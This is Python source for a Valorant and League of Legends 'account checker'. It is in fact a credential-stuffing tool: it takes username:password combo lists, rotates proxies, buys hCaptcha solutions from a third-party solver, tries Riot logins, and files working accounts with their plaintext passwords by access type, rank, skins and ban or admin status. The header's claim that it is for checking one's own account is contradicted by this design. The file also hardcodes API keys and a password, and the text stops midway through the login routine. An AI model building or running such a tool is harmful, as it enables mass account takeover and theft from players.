# WARN THIS TOOL IS DESIGNED FOR CHECKING YOUR OWN ACCOUNT RANK LEVEL AND REGION SKIN CHECK WILL BE DONE SOON
import tls_client
import requests
import json
import random
import time
import os
import re
import sys
import threading
import queue
import ctypes
import math
import uuid # Imported for nonce generation
import base64 # Imported for client platform
import itertools # [NEW] For proxy rotation
from typing import Optional, Dict

# [NEW] Tkinter imports for LoL UI
try:
    import tkinter as tk
    from tkinter import ttk
    from PIL import Image, ImageTk
    import io
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False

# Rich is now used for the UI.
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn
from rich.columns import Columns
from rich.text import Text
from rich.console import Console

# --- GLOBAL VARIABLES INITIALIZATION (FIXED SCOPE) ---
# Initialization ensures they exist in the module scope for all functions/blocks.
# ----------------------------------------------------
num_threads = 1
debug_mode = False
stop_event = threading.Event()  # Event to signal the end of the program to the UI thread
# Pool of TLS sessions (one for each thread, reducing CPU overhead)
THREAD_LOCAL_SESSIONS = threading.local()
# Retry constant for network/captcha issues
MAX_REQUEUES = 3

# --- [CHECK MODE] ---
# 1 = VALORANT, 2 = LOL
CHECK_MODE = 1 

# --- [API CONFIGURATION] ---
# COLOQUE SUA API KEY AQUI
SECRETSOLVER_API_KEY = "5e1cf27420f5bc2f052c16e909768c378f4d52a3e3b21f9cc52d6cfc1f4e9764" 
RIOT_API_KEY = "RGAPI-5ec9ab90-d045-41c0-a241-8cd035d42d25" # From user prompt
# ---------------------------

# --- [NEW] Riot API Rate Limiter ---
from collections import deque

class RateLimiter:
    """A thread-safe rate limiter for the Riot API."""
    def __init__(self, requests_per_short_window, seconds_short, requests_per_long_window, seconds_long):
        self.requests_per_short_window = requests_per_short_window
        self.seconds_short = seconds_short
        self.requests_per_long_window = requests_per_long_window
        self.seconds_long = seconds_long

        self.lock = threading.Lock()
        self.request_timestamps_short = deque()
        self.request_timestamps_long = deque()

    def acquire(self):
        with self.lock:
            current_time = time.time()

            # --- Clean up old timestamps ---
            while self.request_timestamps_short and self.request_timestamps_short[0] <= current_time - self.seconds_short:
                self.request_timestamps_short.popleft()
            while self.request_timestamps_long and self.request_timestamps_long[0] <= current_time - self.seconds_long:
                self.request_timestamps_long.popleft()

            # --- Check and wait for short window ---
            if len(self.request_timestamps_short) >= self.requests_per_short_window:
                wait_time = self.request_timestamps_short[0] - (current_time - self.seconds_short)
                if wait_time > 0:
                    time.sleep(wait_time)

            # --- Re-evaluate current time after potential short sleep ---
            current_time = time.time()

            # --- Check and wait for long window ---
            if len(self.request_timestamps_long) >= self.requests_per_long_window:
                wait_time = self.request_timestamps_long[0] - (current_time - self.seconds_long)
                if wait_time > 0:
                    time.sleep(wait_time)

            # --- Log the new request time ---
            # Use a fresh timestamp after any waiting
            final_time = time.time()
            self.request_timestamps_short.append(final_time)
            self.request_timestamps_long.append(final_time)

# Initialize the rate limiter for Riot API (20 req/1s, 100 req/120s)
riot_rate_limiter = RateLimiter(20, 1, 100, 120)
# -----------------------------------

# [NEW] Riot Region Mapping
RIOT_REGION_MAPPING = {
    # Americas
    "BR1": "americas", "LA1": "americas", "LA2": "americas", "NA1": "americas",
    # Europe
    "EUN1": "europe", "EUW1": "europe", "TR1": "europe", "RU": "europe",
    # Asia
    "JP1": "asia", "KR": "asia", "OC1": "asia", "PBE1": "asia",
    # Esports
    "ESPORTS": "esports"
}


# Global variable to track live API balance
# Started as None to avoid false positives on 0.0 checks before first request
current_api_balance = None 
balance_lock = threading.Lock()

# --- [NEW] Global map for correct skin counting ---
# Maps every variant/level UUID to its parent skin's UUID
SKIN_ID_TO_PARENT_UUID_MAP = {}
# ----------------------------------------------------

# --- Configuration (ATTENTION: Replace with your actual credentials/keys) ---
# Hardcoded Credentials for the PUT request (CHANGE THESE!)
USERNAME = "bgxuser"
PASSWORD = "bgxu373722r0802_"
# User-Token is generally not needed for the local API, but kept for compatibility
USER_TOKEN = "CP_475nGE5qRCNNRDHp1xxgbK7qRYbA6MYhxGzj7yKbpiZ3"

# --- Skin Checker Constants ---
CLIENT_VERSION = "release-08.08-shipping-20-930015"
CLIENT_PLATFORM_B64 = "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"
SKINS_ITEM_TYPE_ID = "e7c63390-eda7-46e0-bb7a-a6abdacd2433"

# [UPDATED] Static User Agent to match Riot Client (Fixes captcha_not_allowed)
USER_AGENT = "RiotClient/43.0.1.4379750.4360827 rso-auth (Windows;10;;Professional, x64)"


# --- Reusable Captcha Solver Function (UPDATED SECRETSOLVER API) ---
def solve_riot_captcha(proxy_url_full: Optional[str], proxies_config: Dict[str, str], rqdata: str) -> Optional[str]:
    """
    Solves the Riot HCaptcha using the SecretSolver API.
    Handles task creation, balance checking, and polling for results.
    Correctly formats proxies from user:pass@ip:port to ip:port:user:pass:protocol.
    """
    global current_api_balance

    if not SECRETSOLVER_API_KEY:
        add_log("ERROR: API Key not set in code.")
        return None

    # Check balance before creating task (Spending money)
    with balance_lock:
        # Only stop if we have a valid confirmed balance AND it is low
        if current_api_balance is not None and current_api_balance <= 10:
            add_log(f"CRITICAL: Balance reached limit ({current_api_balance} <= 10). Stopping checker.")
            stop_event.set()
            return None

    # Endpoints
    create_task_url = "https://secretsolver.xyz/api/createtask"
    
    # --- PROXY FORMATTING LOGIC ---
    formatted_proxy = ""
    if proxy_url_full:
        # Remove protocol prefix if exists
        clean_proxy = proxy_url_full.replace("http://", "").replace("https://", "")
        
        if "@" in clean_proxy:
            try:
                # Split user:pass AND host:port
                auth_part, host_part = clean_proxy.split("@")
                
                # Split user and pass
                if ":" in auth_part:
                    user, password = auth_part.split(":", 1)
                else:
                    user, password = auth_part, ""
                    
                # Reassemble: ip:port:username:password:http
                formatted_proxy = f"{host_part}:{user}:{password}:http"
            except Exception as e:
                add_log(f"Error parsing proxy format '{clean_proxy}': {e}. Using raw.")
                formatted_proxy = f"{clean_proxy}:http"
        else:
            # Assume it's already ip:port or ip:port:user:pass
            # Just append protocol
            formatted_proxy = f"{clean_proxy}:http"
            
    else:
        formatted_proxy = ""

    # Headers
    headers = {
        "Content-Type": "application/json",
        "X-API-Key": SECRETSOLVER_API_KEY
    }

    # Payload
    payload = {
        "rqdata": rqdata if rqdata else "",
        "proxy": formatted_proxy
    }

    try:
        # 1. Create Task
        add_log(f"DEBUG: Solver Creating Task with proxy: {formatted_proxy}")
        response = requests.post(create_task_url, headers=headers, json=payload, timeout=30)
        
        # FIX: Accept 200 AND 201 as success
        if response.status_code not in [200, 201]:
            add_log(f"Solver Create Task Failed: {response.status_code} - {response.text}")
            return None
            
        data = response.json()
        task_id = data.get("task_id")
        
        # Update Balance from Response
        new_balance = data.get("current_balance")
        if new_balance is not None:
            with balance_lock:
                current_api_balance = float(new_balance)
                if current_api_balance <= 10:
                    add_log(f"CRITICAL: Balance dropped to {current_api_balance}. Stopping.")
                    stop_event.set()

        if not task_id:
            add_log("Solver did not return a task_id.")
            return None

        # 2. Check Task Result (Polling Loop)
        check_url = f"https://secretsolver.xyz/api/task/{task_id}"
        
        start_time = time.time()
        # Loop for up to 120 seconds
        while time.time() - start_time < 120:
            if stop_event.is_set():
                return None

            # Wait slightly before checking (polling interval)
            time.sleep(2) 
            
            try:
                check_response = requests.post(check_url, headers=headers, timeout=30)
            except Exception as e:
                # Network glitch during check, retry loop
                continue
            
            if check_response.status_code != 200:
                # API might give 502/500 temporarily, keep polling
                continue
                
            result_data = check_response.json()
            status = result_data.get("status")
            
            # --- Status Handling based on User's JSON examples ---
            
            if status == "completed":
                # Success - "token": "..."
                token = result_data.get("token")
                
                if token:
                    with stats_lock:
                        global_stats['captcha_solves'] += 1
                    return token
                else:
                    add_log(f"Task completed but 'token' is null/missing: {json.dumps(result_data)}")
                    return None
            
            elif status == "failed" or status == "error":
                add_log(f"Solver Task Failed: {json.dumps(result_data)}")
                return None
            
            elif status == "pending" or status == "processing":
                # Continue loop (poll again)
                continue
            
            else:
                # Unknown status?
                add_log(f"Unknown solver status: {status}")
                continue

        add_log("Solver timed out waiting for solution (120s limit).")
        return None

    except Exception as e:
        add_log(f"Exception during captcha solve: {e}")
        return None

# --- [NEW] Function to check initial balance ---
def get_initial_balance(console: Console):
    global current_api_balance
    if not SECRETSOLVER_API_KEY:
        return
    
    url = "https://secretsolver.xyz/api/balance"
    headers = {
        "Content-Type": "application/json",
        "X-API-Key": SECRETSOLVER_API_KEY
    }
    try:
        resp = requests.post(url, headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            bal = data.get("balance")
            if bal is not None:
                with balance_lock:
                    current_api_balance = float(bal)
                console.print(f"[green]Initial Balance: {current_api_balance}[/]")
    except Exception as e:
        console.print(f"[red]Failed to fetch initial balance: {e}[/]")

# --- End Reusable Captcha Solver Function ---

# API Keys for HenrikDev API (Added support for 3 keys)
HENRIKDEV_API_KEYS = [
    "HDEV-0fcffcc7-1aa1-45ff-a2c0-c89d006495a1",  # Key 1 (Original)
    "HDEV-496d6e93-08e9-4d5b-bceb-60a5bbfd490d",  # Key 2
    "HDEV-c3492069-bad3-4698-aff0-ec55f1f8d0dd"   # Key 3
]

# Sitekey
# Riot's actual sitekey is usually: "019f1553-3845-481c-a6f5-5a60ccf6d830"
SITEKEY = "019f1553-3845-481c-a6f5-5a60ccf6d830"

# Global Counters and Rank Mapping
global_stats = {
    "hits": 0, "fails": 0, "2fa": 0, "checked": 0, "total": 0, "errors": 0,
    "invalid_requests": 0, "nocapture": 0, "requeues": 0, "captcha_solves": 0,
    "fa": 0, "nfa": 0,
    "banned": 0, "permabanned": 0 # [NEW] LoL Stats
}
RANK_TIERS = ["No rank", "Iron", "Bronze", "Silver", "Gold", "Platinum", "Diamond", "Ascendant", "Immortal", "Radiant"]
rank_counts = {rank: {"FA": 0, "NFA": 0} for rank in RANK_TIERS}

# [UPDATED] Separated Regions
VALORANT_REGIONS = ["EU", "NA", "AP", "BR", "KR", "LATAM", "UNKNOWN"]
LOL_REGIONS = ["BR1", "EUN1", "EUW1", "LA1", "LA2", "NA1", "PBE1", "OC1", "TR1", "UNKNOWN"]

# Initialize all possible keys to avoid UI errors
region_counts = {}
for r in VALORANT_REGIONS: region_counts[r] = {"FA": 0, "NFA": 0}
for r in LOL_REGIONS: 
    if r not in region_counts: region_counts[r] = {"FA": 0, "NFA": 0}

# [NEW] Skin counter structure
SKIN_RANGES = ["1-10", "11-20", "21-50", "51-100", "101-200", "200+"]
skin_counts = {range_key: {"FA": 0, "NFA": 0} for range_key in SKIN_RANGES}

# [NEW] Champion counter structure for LoL
CHAMPION_RANGES = ["1-20", "21-50", "51-100", "101-150", "150+"]
champion_counts = {range_key: {"FA": 0, "NFA": 0} for range_key in CHAMPION_RANGES}


stats_lock = threading.Lock()
file_lock = threading.Lock()
print_lock = threading.Lock()
json_storage_lock = threading.Lock()

# NEW GLOBAL: Start time for CPM calculation
start_time_for_cpm = 0
last_cpm_check = 0
last_checked = 0
cpm = 0

# --- HenrikDev Rate Limit Globals (Modified for 3 keys) ---
HENRIKDEV_LIMIT = 20  # Limit before re-queuing
HENRIKDEV_RESET_TIME = 60  # Seconds
HENRIKDEV_KEY_STATES = [
    {"key": k, "count": 0, "last_reset": time.time()} for k in HENRIKDEV_API_KEYS
]

# Read proxies from proxies.txt
proxies = []
proxy_iterator = None # Global iterator

try:
    with open('proxies.txt', 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            proxy_iterator = itertools.cycle(proxies)
except FileNotFoundError:
    pass
    # Rich will handle printing this message now
    
# --- CMD Title (ctypes) ---
def set_cmd_title(title):
    """Updates the CMD window title on Windows."""
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(title)

# --- Utility Functions ---
def save_error_log(combo_line: str, error_type: str, details: str):
    """Saves the combo and error details to errors.txt."""
    output_base_dir = "output"
    error_file_path = os.path.join(output_base_dir, "errors.txt")

    try:
        os.makedirs(output_base_dir, exist_ok=True)
    except Exception:
        pass

    # Format and write the log
    content = f"Combo: {combo_line} | Error Type: {error_type} | Details: {details}\n"
    with file_lock:
        try:
            with open(error_file_path, 'a', encoding='utf-8') as f:
                f.write(content)
        except Exception:
            pass

def add_log(message):
    """[MODIFIED] Logs to console if debug_mode is True, and ALWAYS saves to log.txt."""
    global debug_mode
    
    # Prepare the formatted log message with timestamp and thread name
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    thread_name = threading.current_thread().name
    formatted_message = f"[{timestamp}] [{thread_name}] {message}"

    # Use a lock to prevent race conditions for both file writing and printing
    with print_lock:
        # Always write to the log file
        try:
            with open("log.txt", 'a', encoding='utf-8') as f:
                f.write(formatted_message + '\n')
        except Exception as e:
            # If logging to file fails, print an error to console so it's not silent
            print(f"!!! FAILED TO WRITE TO LOG FILE: {e} !!!")

        # Also print to console if debug mode is enabled
        if debug_mode:
            console = Console()
            console.print(formatted_message)

def convert_to_preferred_format(seconds):
    seconds = int(seconds)
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        return f"{seconds//60}m {seconds%60}s"
    else:
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h}h {m}m {s}s"

def get_skin_range(count: int) -> Optional[str]:
    """[NEW] Categorizes a skin count into a predefined range string."""
    if count == 0: return None
    if 1 <= count <= 10: return "1-10"
    if 11 <= count <= 20: return "11-20"
    if 21 <= count <= 50: return "21-50"
    if 51 <= count <= 100: return "51-100"
    if 101 <= count <= 200: return "101-200"
    if count > 200: return "200+"
    return None

def get_champion_range(count: int) -> Optional[str]:
    """[NEW] Categorizes a champion count into a predefined range string for LoL."""
    if count == 0: return None
    if 1 <= count <= 20: return "1-20"
    if 21 <= count <= 50: return "21-50"
    if 51 <= count <= 100: return "51-100"
    if 101 <= count <= 150: return "101-150"
    if count > 150: return "150+"
    return None

# --- [NEW] Rich-based UI Generation ---
def generate_layout() -> Panel:
    """Generates the entire UI layout using Rich components."""
    global last_cpm_check, last_checked, cpm, current_api_balance, CHECK_MODE

    # --- CPM Calculation ---
    current_time = time.time()
    if current_time - last_cpm_check >= 1.0: # Update CPM every second for smoother display
        if last_cpm_check > 0:
            elapsed_time = current_time - last_cpm_check
            newly_checked = global_stats['checked'] - last_checked
            if elapsed_time > 0:
                cpm = (newly_checked / elapsed_time) * 60
        last_cpm_check = current_time
        last_checked = global_stats['checked']

    # --- Header Information ---
    checked = global_stats["checked"]
    total = global_stats["total"]
    hitrate = f"{(global_stats['hits'] / checked * 100):.1f}%" if checked else "0.0%"
    est_time_seconds = ((total - checked) / (cpm / 60)) if cpm > 0 else 0
    est_text = convert_to_preferred_format(est_time_seconds)
    
    # Get current balance safely
    with balance_lock:
        display_balance = current_api_balance if current_api_balance is not None else "Checking..."

    mode_text = "VALORANT" if CHECK_MODE == 1 else "LEAGUE OF LEGENDS"

    # Update CMD Title
    set_cmd_title(f"{mode_text} Checker | Balance: {display_balance} | {checked}/{total} | {int(cpm)} CPM | Hitrate {hitrate} | Est: {est_text}")

    # --- Create Rich Components ---
    # Progress Bar
    progress_bar = Progress(
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn(f"({checked} / {total})"),
        expand=True
    )
    progress_bar.add_task("Progress", total=total, completed=checked)

    # Header Panel
    header_text = Text.from_markup(f"Mode: [bold red]{mode_text}[/] | Proxies: [cyan]{len(proxies)}[/] | Threads: [cyan]{num_threads}[/] | CPM: [cyan]{int(cpm)}[/] | API Balance: [cyan]{display_balance}[/]", justify="center")
    header_panel = Panel(
        Text("https://github.com/pinkogghoul/Valorant-Account-Checker", justify="center", style="bold blue"),
        title=f"{mode_text} Checker",
        border_style="green"
    )

    # --- Tables ---
    # Main Stats Table
    main_table = Table(title="[bold]Main Stats[/]", title_justify="left", border_style="cyan")
    main_table.add_column("Stat", style="dim")
    main_table.add_column("Value", justify="right")
    main_table.add_row("Valid", f"[green]{global_stats['hits']}[/] ({hitrate})")
    main_table.add_row("Fails", f"[red]{global_stats['fails']}[/]")
    main_table.add_row("2FA", f"[yellow]{global_stats['2fa']}[/]")
    main_table.add_row("FA", f"[bright_green]{global_stats['fa']}[/]")
    main_table.add_row("NFA", f"[bright_yellow]{global_stats['nfa']}[/]")
    main_table.add_row("Errors", f"[bright_red]{global_stats['errors']}[/]")
    main_table.add_row("Retries", f"[yellow]{global_stats['invalid_requests']}[/]")
    main_table.add_row("Re-queues", f"[yellow]{global_stats['requeues']}[/]")
    main_table.add_row("NoCapture", f"[magenta]{global_stats['nocapture']}[/]")

    if CHECK_MODE == 2:
        # Add LoL specific stats
        main_table.add_row("Banned", f"[red]{global_stats['banned']}[/]")
        main_table.add_row("Perma Banned", f"[dark_red]{global_stats['permabanned']}[/]")
    
    # Regions Table
    regions_table = Table(title="[bold]Regions[/]", title_justify="left", border_style="magenta")
    regions_table.add_column("Region", style="dim")
    regions_table.add_column("NFA", justify="center")
    regions_table.add_column("FA", justify="center")
    
    # Display correct regions based on mode
    active_regions = VALORANT_REGIONS if CHECK_MODE == 1 else LOL_REGIONS
    for region in active_regions:
        regions_table.add_row(region, f"[yellow]{region_counts[region]['NFA']}[/]", f"[green]{region_counts[region]['FA']}[/]")
        
    # --- Assemble Layout ---
    if CHECK_MODE == 1:
        # Valorant: Show Ranks and Skins
        ranks_table = Table(title="[bold]Ranks[/]", title_justify="left", border_style="yellow")
        ranks_table.add_column("Rank", style="dim")
        ranks_table.add_column("NFA", justify="center")
        ranks_table.add_column("FA", justify="center")
        for rank in RANK_TIERS:
            ranks_table.add_row(rank, f"[yellow]{rank_counts[rank]['NFA']}[/]", f"[green]{rank_counts[rank]['FA']}[/]")

        skins_table = Table(title="[bold]Skins Count[/]", title_justify="left", border_style="blue")
        skins_table.add_column("Range", style="dim")
        skins_table.add_column("NFA", justify="center")
        skins_table.add_column("FA", justify="center")
        for skin_range in SKIN_RANGES:
            skins_table.add_row(skin_range, f"[yellow]{skin_counts[skin_range]['NFA']}[/]", f"[green]{skin_counts[skin_range]['FA']}[/]")
            
        table_columns = Columns([main_table, regions_table, ranks_table, skins_table])
    else:
        # LoL: Show Main stats, Regions, and Champion counts
        champions_table = Table(title="[bold]Champions Count[/]", title_justify="left", border_style="green")
        champions_table.add_column("Range", style="dim")
        champions_table.add_column("NFA", justify="center")
        champions_table.add_column("FA", justify="center")
        for champ_range in CHAMPION_RANGES:
            champions_table.add_row(champ_range, f"[yellow]{champion_counts[champ_range]['NFA']}[/]", f"[green]{champion_counts[champ_range]['FA']}[/]")

        table_columns = Columns([main_table, regions_table, champions_table])

    layout = Table.grid(expand=True, padding=1)
    layout.add_row(header_panel)
    layout.add_row(header_text)
    layout.add_row(progress_bar)
    layout.add_row(table_columns)
    layout.add_row(Text(f"Estimated time remaining: {est_text}", justify="center", style="cyan"))
    
    return Panel(layout, border_style="dim")

def get_available_henrikdev_key():
    """
    Selects the least-used HenrikDev API key that is not rate-limited.
    Returns (api_key: str, key_index: int) or None, -1 if all are rate-limited.
    """
    global HENRIKDEV_KEY_STATES, HENRIKDEV_LIMIT, HENRIKDEV_RESET_TIME
    with stats_lock:
        current_time = time.time()

        # 1. Reset counters if reset time passed
        for state in HENRIKDEV_KEY_STATES:
            if current_time - state["last_reset"] > HENRIKDEV_RESET_TIME:
                state["count"] = 0
                state["last_reset"] = current_time

        # 2. Find the key with the minimum count (and is not at the limit)
        best_key_state = None
        min_count = HENRIKDEV_LIMIT + 1  # Initialize higher than max count

        # Use random choice among best keys to avoid one key being constantly hammered
        eligible_states = []
        for state in HENRIKDEV_KEY_STATES:
            if state["count"] < HENRIKDEV_LIMIT:
                if state["count"] < min_count:
                    min_count = state["count"]
                    eligible_states = [state]  # New minimum found
                elif state["count"] == min_count:
                    eligible_states.append(state)  # Add to list of best options

        if eligible_states:
            best_key_state = random.choice(eligible_states)

            # Increment the count for the selected key
            best_key_state["count"] += 1
            # Find the index for returning
            key_index = HENRIKDEV_KEY_STATES.index(best_key_state)
            return best_key_state["key"], key_index
        else:
            # All keys are rate-limited
            return None, -1

def get_session_for_thread(user_agent: str) -> tls_client.Session:
    """Gets or creates a reusable tls_client session for the current thread."""
    if not hasattr(THREAD_LOCAL_SESSIONS, "session"):
        # Creates the session only once per thread
        session = tls_client.Session(client_identifier="chrome_124")
        session.headers.update({"User-Agent": user_agent})
        # Add headers from reference code
        session.headers.update({
             "Accept-Language": "en-US,en;q=0.9",
             "Accept": "application/json, text/plain, */*"
        })
        THREAD_LOCAL_SESSIONS.session = session
    return THREAD_LOCAL_SESSIONS.session

def get_henrikdev_mmr_info(puuid: str, region: str, user_agent: str, proxy_url: Optional[str]):
    """Fetches Valorant MMR details using a reusable session and an available API key."""

    api_key, key_index = get_available_henrikdev_key()
    if api_key is None:
        return "RATE_LIMIT_HIT"

    session = get_session_for_thread(user_agent)  # Reuse the session
    platform = "pc"
    mmr_url = f"https://api.henrikdev.xyz/valorant/v3/by-puuid/mmr/{region}/{platform}/{puuid}"
    mmr_headers = {"User-Agent": user_agent, "Authorization": api_key}

    try:
        add_log(f"DEBUG: HenrikDev MMR GET Request to {mmr_url}")
        add_log(f"DEBUG: HenrikDev MMR GET Headers: {json.dumps(mmr_headers)}")
        mmr_response = session.get(mmr_url, headers=mmr_headers, timeout_seconds=10, proxy=proxy_url)
        add_log(f"DEBUG: HenrikDev MMR GET Status: {mmr_response.status_code}")
        add_log(f"DEBUG: HenrikDev MMR GET Response Text: {mmr_response.text}")
        if mmr_response.status_code == 429:
            with stats_lock:
                HENRIKDEV_KEY_STATES[key_index]["count"] = HENRIKDEV_LIMIT
            return "RATE_LIMIT_HIT"
        if mmr_response.status_code == 404:
            return "No rank"
        elif mmr_response.status_code == 200:
            tier_data = mmr_response.json().get("data", {}).get("current", {}).get("tier", {})
            rank_name = tier_data.get("name")
            if rank_name == "Unrated":
                return "No rank"
            return rank_name
        return None
    except Exception as e:
        # Returns the exception error to be logged in check_account
        return f"EXCEPTION: {str(e)}"

def save_account_info(username: str, password: str, region: str, account_level: int, rank_name: str, account_type: str, skin_count: int):
    """[VALORANT] Creates FA/NFA folders and saves account information with skin count. Handles Unlocked (Level 30+)."""
    base_folder = "Valorant"
    
    # [NEW] Unlocked Logic for Valorant
    if account_level >= 30:
        output_base_dir = os.path.join("output", base_folder, "UNLOCKED", account_type)
    else:
        output_base_dir = os.path.join("output", base_folder, account_type)
        
    region_dir = os.path.join(output_base_dir, region.upper())

    normalized_rank = rank_name.replace(' ', '_').title()
    file_name = f"{normalized_rank}.txt"
    file_path = os.path.join(region_dir, file_name)

    try:
        os.makedirs(region_dir, exist_ok=True)
        content = (f"{username}:{password} | Region: {region.upper()} | Account Level: {account_level} | Rank: {rank_name} | Skins: {skin_count}\n")
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(content)
        return True
    except Exception:
        return False

# --- [NEW] LoL Saving Logic ---
def save_lol_info(username: str, password: str, region: str, fa: bool, is_admin: bool, is_banned: bool, is_perma: bool, level: int, champion_count: int, champion_mastery: list):
    """
    [LOL] Saves account info based on specific rules:
    - Hits (not banned, not admin): output/LoL/[REGION]/hits.txt
    - UNLOCKED (Level 30+): output/LoL/UNLOCKED/[FA/NFA]/[REGION]/hits.txt
    - Banned: output/LoL/BANNED/banned.txt (and permabanned.txt if perma)
    - Admin: output/LoL/ADM/adm.txt
    """
    base_lol = os.path.join("output", "LoL")
    fa_str = "true" if fa else "false"
    type_dir_name = "FA" if fa else "NFA"
    region_clean = region.upper() if region else "UNKNOWN"

    try:
        if is_banned:
            banned_dir = os.path.join(base_lol, "BANNED")
            os.makedirs(banned_dir, exist_ok=True)
            
            # Save to banned.txt (user requested this format to be unchanged)
            with open(os.path.join(banned_dir, "banned.txt"), 'a', encoding='utf-8') as f:
                f.write(f"{username}:{password}\n")
            
            if is_perma:
                with open(os.path.join(banned_dir, "permabanned.txt"), 'a', encoding='utf-8') as f:
                    f.write(f"{username}:{password}\n")
            return

        # New format for ADM and Hits
        # poolblayJK:123456789q FA:true or false Level:quantidade Champions:quantidade Is banned:true or false Is Rioter(admin):True or false

        if is_admin:
            adm_dir = os.path.join(base_lol, "ADM")
            os.makedirs(adm_dir, exist_ok=True)
            content = f"{username}:{password} FA:{fa_str} Level:{level} Champions:{champion_count} Is banned:{str(is_banned).lower()} Is Rioter(admin):true\n"
            with open(os.path.join(adm_dir, "adm.txt"), 'a', encoding='utf-8') as f:
                f.write(content)
            # Admins also show up in the UI
        else:
            # If not banned and not admin, it's a regular hit
            # [NEW] Unlocked Logic for LoL
            if level >= 30:
                hit_dir = os.path.join(base_lol, "UNLOCKED", type_dir_name, region_clean)
            else:
                # Standard hit
                hit_dir = os.path.join(base_lol, region_clean)

            os.makedirs(hit_dir, exist_ok=True)
            content = f"{username}:{password} FA:{fa_str} Level:{level} Champions:{champion_count} Is banned:false Is Rioter(admin):false\n"
            with open(os.path.join(hit_dir, "hits.txt"), 'a', encoding='utf-8') as f:
                f.write(content)

        # [NEW] Update champion counts for the UI
        with stats_lock:
            champ_range = get_champion_range(champion_count)
            if champ_range:
                account_type = "FA" if fa else "NFA"
                champion_counts[champ_range][account_type] += 1

        # [NEW] Add hit to the Tkinter UI queue if available and not banned
        if not is_banned and 'lol_hits_queue' in globals() and lol_hits_queue is not None:
            hit_for_ui = {
                "username": username,
                "password": password,
                "level": level,
                "champion_count": champion_count,
                "champion_mastery": champion_mastery
            }
            lol_hits_queue.put(hit_for_ui)

            # [NEW] Save detailed hit to JSON file
            json_file_path = os.path.join("output", "LoL", "lol_hits_details.json")
            with json_storage_lock:
                # This nested try/except is for the JSON operations specifically
                try:
                    # Read existing data
                    try:
                        with open(json_file_path, 'r', encoding='utf-8') as f:
                            all_hits_data = json.load(f)
                    except (FileNotFoundError, json.JSONDecodeError):
                        all_hits_data = [] # Start with an empty list if file doesn't exist or is invalid

                    # Append new hit
                    all_hits_data.append(hit_for_ui)

                    # Write back to the file
                    with open(json_file_path, 'w', encoding='utf-8') as f:
                        json.dump(all_hits_data, f, indent=4)

                except Exception as e:
                    add_log(f"Failed to write to detailed LoL JSON log: {e}")

    except Exception as e:
        add_log(f"Failed to save LoL account: {e}")

def save_nocapture_info(combo_line: str):
    """Saves the combo to output/NOCAPTURE/hits.txt and increments the nocapture counter."""
    with stats_lock:
        global_stats["nocapture"] += 1
    output_base_dir = "output"
    nocapture_dir = os.path.join(output_base_dir, "NOCAPTURE")
    file_path = os.path.join(nocapture_dir, "hits.txt")

    try:
        os.makedirs(nocapture_dir, exist_ok=True)
        content = f"{combo_line}\n"
        with open(file_path, 'a', encoding='utf-8') as f:
            f.write(content)
        return True
    except Exception:
        return False

# --- Main Checker Logic ---
def check_account(combo_line_with_retries, combo_queue):
    """Handles the entire check flow for a single combo with retry logic and rate limiting."""
    global global_stats, rank_counts, region_counts, skin_counts, SKIN_ID_TO_PARENT_UUID_MAP, current_api_balance, CHECK_MODE, proxy_iterator

    # Check for Stop Event first
    if stop_event.is_set():
        return

    # Format: combo_line | current_requeues
    parts = combo_line_with_retries.split(" | ")
    combo = parts[0]
    username, password = combo.split(":")[:2]
    current_requeues = int(parts[1]) if len(parts) > 1 else 0

    # --- Login/Captcha Retry Loop (MAX_REQUEUES attempts) ---
    MAX_LOGIN_RETRIES = 3 # [UPDATED] Max 3 retries (total 4 attempts)
    login_put_data = {}
    login_failed_with_errors = False
    error_details = "Unknown"

    # [UPDATED] Strict Proxy Rotation (One proxy per account)
    # Get a single proxy for this entire account check sequence
    proxy_str: Optional[str] = None
    if proxy_iterator:
        try:
            with stats_lock: # Thread-safe iterator access
                proxy_str = next(proxy_iterator)
        except StopIteration:
            pass # Should not happen with cycle, but safe guard

    proxy_url: Optional[str] = f"http://{proxy_str}" if proxy_str else None

    # Configure proxies for the standard 'requests' module
    proxies_config = {}
    if proxy_url:
        proxies_config = {"http": proxy_url, "https": proxy_url}

    for attempt in range(MAX_LOGIN_RETRIES + 1):
        if stop_event.is_set(): return

        if attempt > 0:
            add_log(f"Retrying LOGIN for {combo} (Attempt {attempt}/{MAX_LOGIN_RETRIES})...")
            time.sleep(2)

        login_failed_with_errors = False  # Reset flag for each attempt

        # Reuse the TLS session from the per-thread pool
        session = get_session_for_thread(USER_AGENT)
        
        # --- [NEW] Authorization Request (Step 2) ---
        auth_url = "https://auth.riotgames.com/api/v1/authorization"
        # CLEANED PAYLOAD
        auth_payload = {
            "client_id": "riot-client",
            "nonce": "1", # Reference uses "1"
            "redirect_uri": "http://localhost/redirect",
            "response_type": "token id_token",
            "scope": "openid link ban lol_region account"
        }
        try:
            add_log(f"DEBUG: Auth POST Request to {auth_url}")
            add_log(f"DEBUG: Auth POST Payload: {json.dumps(auth_payload)}")
            auth_response = session.post(auth_url, json=auth_payload, timeout_seconds=10, proxy=proxy_url)
            add_log(f"DEBUG: Auth POST Status: {auth_response.status_code}")
            
            # Check for 200 or 204 as success
            if auth_response.status_code not in [200, 204]:
                 error_details = f"Auth_Post_Failed - Status: {auth_response.status_code} Response: {auth_response.text}"
                 add_log(f"Authorization request failed: {error_details}")
                 login_failed_with_errors = True
                 continue
        except Exception as e:
            msg = str(e)
            if "unexpected EOF" in msg:
                add_log(f"Network error (Unexpected EOF in Auth). Retrying... (Attempt {attempt+1})")
                time.sleep(1.5)
                login_failed_with_errors = True
                continue
